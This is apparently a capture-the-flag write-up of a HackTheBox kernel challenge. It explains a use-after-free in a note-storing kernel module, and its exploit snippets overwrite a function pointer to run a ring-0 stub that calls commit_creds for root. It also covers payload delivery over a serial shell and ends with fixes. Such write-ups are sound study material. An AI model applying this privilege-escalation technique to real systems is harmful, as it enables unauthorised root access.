## Overview

KNote is a **Medium** HackTheBox **Pwn** challenge — a Linux kernel module (`/dev/knote`) that stores "encrypted" notes in kernel space. You land as an unprivileged `user` and must become root to read `/flag` (mode `400`). The module leaks nothing and the notes are per-slot, but a missing `NULL` after a failed allocation leaves a dangling pointer in the `kmalloc-32` slab — enough to overwrite an embedded function pointer and, because the kernel ships with no SMEP/SMAP/KASLR/KPTI, jump straight into a userland privilege-escalation stub running in ring 0.

## The technique

Each note is backed by this structure:

```c
struct knote { char *data; size_t len; void (*encrypt_func)(char*,size_t); void (*decrypt_func)(char*,size_t); };
```

That is exactly **32 bytes**, so it lives in the **`kmalloc-32`** slab — the same slab as the note `data` buffer (`len ≤ 0x20`). The struct also carries two function pointers the kernel later calls via the `ENCRYPT`/`DECRYPT` ioctls. Control one of those pointers and you control kernel execution.

The bug is a classic [use-after-free](https://cwe.mitre.org/data/definitions/416.html) via a missing `NULL`. In `KNOTE_CREATE`, if copying the note body from userspace fails, the handler frees both allocations but never clears the array slot:

```c
if (copy_from_user(knotes[idx]->data, ku.data, len)) {
    kfree(knotes[idx]->data);
    kfree(knotes[idx]);
    /* MISSING: knotes[idx] = NULL; */
    return -EFAULT;
}
```

You force that failure on demand by handing `CREATE` an **invalid userland `data` pointer** — the struct is already allocated and stored in `knotes[idx]` before the copy is attempted, so after the failure `knotes[idx]` dangles at freed memory.

## Solution

The [double-free](https://cwe.mitre.org/data/definitions/415.html) primitive collapses into control flow with three `CREATE`s and one `ENCRYPT`:

```c
kcreate(0, "AAAA", 0x20);              // warm the kmalloc-32 cache
kcreate(1, (char*)0x1000, 0x20);       // copy_from_user fails -> knote1+data1 freed, knotes[1] DANGLING
u64 fake[4] = { (u64)fake, 0x20, (u64)escalate, (u64)escalate };
kcreate(2, (char*)fake, 0x20);         // fresh data kmalloc pops freed knote1 -> our 32 bytes land
                                       // exactly where knotes[1] still points. encrypt_func = escalate.
kencrypt(1);                           // kernel calls knotes[1]->encrypt_func() == escalate() in RING0
```

Because there is no SMEP, `escalate()` — a *userland* function — executes with kernel privilege. It grabs root credentials and returns cleanly to userspace:

```c
void escalate(void) {
    commit_creds(prepare_kernel_cred(0));   // give this task root creds
    swapgs;                                  // restore user GS
    iretq;                                   // return to userland (get_shell) as root -> cat /flag
}
```

`/proc/kallsyms` was `kptr_restrict`ed for the low-privileged user, so the exploit tries to read the two symbol addresses at runtime and falls back to fixed values — which are correct because there is no KASLR.

One operational detail cost the most time: the remote wraps qemu in a `timeout ~35s` (the tell is `qemu-system-x86_64: terminating on signal 15`). Boot eats ~15s, so delivery plus execution must fit in ~20s. The fix is to build a **freestanding** exploit (`-nostdlib -static -no-pie`, ~13 KB → gzip+base64 ≈ 2.6 KB) and push it over the serial shell as **short lines** — one giant line trips the tty canonical line limit and resets the connection:

```sh
gcc -nostdlib -static -no-pie -fno-stack-protector -o ex ex.c && strip ex && gzip -9c ex | base64 -w0 > ex.b64
```

Then, on the guest shell, reassemble in ≤240-byte chunks and run:

```sh
# for each chunk:  printf %s <chunk> >>b
base64 -d b | zcat > x; chmod +x x; ./x
```

The exploit self-prints the flag (`open`/`read` of `/flag`) before dropping to a root shell, so the whole thing races well inside the timeout. Result:

```
[+] UID 0 - root
FLAG: HTB{...}
```

## Why it worked

The whole chain rides on one missing line. Freeing `knotes[idx]->data` and `knotes[idx]` without setting `knotes[idx] = NULL` leaves a live reference to freed slab memory. Since the struct and a user-controlled buffer share `kmalloc-32`, the next `data` allocation reuses the freed struct's chunk, and the bytes you copy in *become* the struct — including its `encrypt_func` pointer. The kernel then dereferences and calls that attacker-supplied pointer. With SMEP and KPTI disabled, pointing it at a userland stub gives ring-0 code execution for free, and `commit_creds(prepare_kernel_cred(0))` finishes the job. When a kernel object with no inline function pointer is the only `kmalloc-32` occupant, the generic equivalent is spraying `seq_operations` structs by opening `/proc/self/stat`.

## Fix / defense

- Set `knotes[idx] = NULL` immediately after every `kfree` (and never free the same slot twice) — the primitive dies with that one line.
- Build the kernel with **KASLR + SMEP + SMAP + KPTI**; SMEP alone breaks the userland-function call, and KASLR breaks the fixed-address payload.
- Avoid storing raw function pointers in user-reachable heap objects; use validated dispatch tables or indices instead of callable addresses.
- Track per-slot allocation state so `READ`/`ENCRYPT`/`DECRYPT` refuse a freed entry.
